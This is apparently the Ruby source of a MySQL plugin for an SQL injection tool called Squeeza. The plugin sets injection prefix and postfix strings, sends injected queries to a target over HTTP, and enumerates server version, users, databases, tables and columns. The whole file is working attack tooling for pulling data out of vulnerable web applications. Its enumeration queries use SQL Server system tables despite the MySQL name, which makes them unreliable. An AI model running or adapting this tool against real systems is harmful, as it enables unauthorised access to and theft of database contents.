require 'squeezahttp'
require 'mysqlreturnchannelviahttp'

class MySQL < SqueezaPlugin
	#@http_req = nil
	
	def MySQL.help
		puts "mysql module commands and variables"
		puts " commands:"
		puts "  !channel : shows current return channel"
		puts "  !channel <name> : switches return channel to <name>"
#		puts "  !cmd    : switches to command execution mode"
#		puts "  !copy   : switches to file copy mode"
		puts "  !sql    : switches to sql extraction mode"
		puts "   !ret <option>  : executes pre-set database queries, where option is one of: info databases tables. Only valid with !sql"
		puts " variables:"
#		puts "  cmd_table_name    : temporary table name for command execution"
#		puts "  cp_table_name     : temporary table name for file copy"
#		puts "  lines_per_request : number of lines to attempt to fetch per http request (if channel support is available. only dns support so far)"
		puts "  mysql_channel     : current return channel type"
		puts "  mysql_mode        : current exploitation mode"
		puts "  sql_prefix        : sql injection string prefix"
		puts "  sql_postfix       : sql injection string postfix"
	end
	
	def help
		MySQL.help
		@channel.help if !@channel.nil?
		HTTPRequestor.help
	end

	def initialize(config)
		@config = config

		
		if (@config.getv("mysql_mode").nil?)
			@config.setv("mysql_mode","sql") 
		end

		if @config.getv("sql_prefix").nil?
			@config.setv("sql_prefix","")
		end
		
		if @config.getv("sql_postfix").nil?
			@config.setv("sql_postfix","")
		end

		if @config.getv("mysql_channel").nil?
			@config.setv("mysql_channel","http")
		end

		@http = HTTPRequestor.new(@config.getv("host"), @config.getv("port"), @config.getv("method"), @config.getv("url"), @config.getv("querystring"), @config.getv("headers"), (@config.getv("ssl")=="on"? true : false), @config.getv("http_resp_ok"))

		@config.set_command("sql")  { 
			@config.setv("mysql_mode","sql") 
			@config.set_command("ret") {|option|
				sql_enumerate(option)
			} if @config.get_command("ret").nil?
		}
		initial_mode = @config.getv("mysql_mode")
		@config.get_command(initial_mode ? initial_mode: "cmd").call()

		@channel = nil
		@config.set_command("channel") {|channel| 
			case channel
			when "http"
				@channel = MySQLReturnChannelViaHTTP.new(@http, @config) if !@channel.is_a?MySQLReturnChannelViaHTTP
				@config.setv("mysql_channel",channel)
			when nil
				puts @config.getv("mysql_channel")
			else
				Debug.error("Unknown channel, possible options are: http")
			end
		}

		initial_channel = @config.getv("mysql_channel")
		@config.get_command("channel").call(initial_channel)
		
		#x= @http_req.send("wqeqweqwe")
		#puts x.body
	end


	def sql_enumerate(option)
		return if @config.getv("mysql_mode") != "sql"
		block = Proc.new {|linenum,line| puts line}
		case option
		when "info"
			sql_command = "@@version+'|'+USER_NAME()+'|'+SYSTEM_USER+'|'+HOST_NAME() sysobjects name='sysobjects'"
			block = Proc.new {|linenum,line| (version,username,sysuser,hostname) = line.split(/\|/); puts "Version\n=======\n#{version}\n\nUsername\n========\n#{username}\n\nSysuser\n=======\n#{sysuser}\n\nHostname\n========\n#{hostname}" }
		when "databases"
			sql_command = "name master..sysdatabases"
		when "tables"
			sql_command = "name sysobjects xtype='U'"
		when /columns (.+)$/
			sql_command = "syscolumns.name syscolumns,sysobjects sysobjects.name='#{$1}' and sysobjects.id=syscolumns.id"
		end

		get_sql(sql_command,&block)
	end

	def get_sql(command, &block)

		(column,table,whereclause) = command.split(/ /,3)
		if column.nil? || table.nil?
			Debug.error("Invalid SQL line. Format is: columnname tablename where-clause")
			Debug.error("e.g		table_name information_schema.tables table_name='blah'")
			return
		end

		whereclause = " where #{whereclause}" if !whereclause.nil?
	
		begin
			@channel.start({"lines_per_request" => @config.getv("lines_per_request"), "column_name"=>column, "table_name" => table, "where_clause" => whereclause})
		rescue MySQLReturnChannelViaHTTP::CouldNotDetermineQuerySizeException
			Debug.error("Could not deteremine size of query... error is generic. Check that your injection point supports multi-line queries, is displaying errors, and you've got the parameter names correct")
		else
			@channel.eachline{|linenum,line|
				if block_given?
					block.call(linenum,line)
				else
					puts line
				end
			}
		end
	end


	def send_cmd(command)
		Debug.print("Sending command",2)

		case @config.getv("mysql_mode")
			when "sql"
				get_sql(command)
			else
				Debug.error("Unknown mysql mode #{@config.getv("mysql_mode")}")
		end
	end
end
